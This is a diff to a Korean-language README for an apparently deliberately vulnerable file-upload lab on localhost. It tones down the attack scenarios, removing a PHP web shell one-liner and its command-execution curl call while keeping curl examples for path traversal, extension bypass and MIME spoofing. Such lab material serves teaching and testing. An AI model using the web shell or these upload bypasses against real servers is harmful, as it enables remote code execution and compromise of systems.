@@ -9,7 +9,7 @@
 ## 취약점 설명
 
 ### 1. 확장자 검증 없음
-모든 파일 유형 업로드 허용 (웹셸, 실행 파일 등)
+모든 파일 유형 업로드 허용 (스크립트 파일, 실행 파일 등)
 
 ### 2. MIME 타입 검증 없음
 Content-Type 헤더만 검사하거나 아예 검사하지 않음
@@ -34,13 +34,14 @@ docker-compose up --build
 
 ## 공격 시나리오
 
-### 1. 웹셸 업로드
+### 1. 스크립트 파일 업로드
 ```bash
-# PHP 웹셸 생성
-echo '<?php system($_GET["cmd"]); ?>' > webshell.php
+# 허용되지 않은 확장자 테스트
+echo 'test content' > test.php
+curl -F "file=@test.php" http://localhost:5001/upload
 
-# 업로드 후 실행
-curl "http://localhost:5001/uploads/webshell.php?cmd=whoami"
+# 취약한 버전: 업로드 성공
+# 안전한 버전: "File type not allowed" 에러
 ```
 
 ### 2. 경로 탐색 공격
@@ -50,22 +51,22 @@ curl -F "file=@test.txt;filename=../../../tmp/evil.txt" \
      http://localhost:5001/upload
 ```
 
-### 3. 확장자 우회
+### 3. 확장자 우회 기법
 ```
 # 이중 확장자
-malware.php.jpg
+test.php.jpg
 
 # 널 바이트 (구버전 취약점)
-malware.php%00.jpg
+test.php%00.jpg
 
 # 대소문자 변형
-malware.PhP
+test.PhP
 ```
 
 ### 4. MIME 타입 위조
 ```bash
 # Content-Type을 image/jpeg로 위장
-curl -F "file=@webshell.php;type=image/jpeg" \
+curl -F "file=@test.php;type=image/jpeg" \
      http://localhost:5001/upload
 ```
 
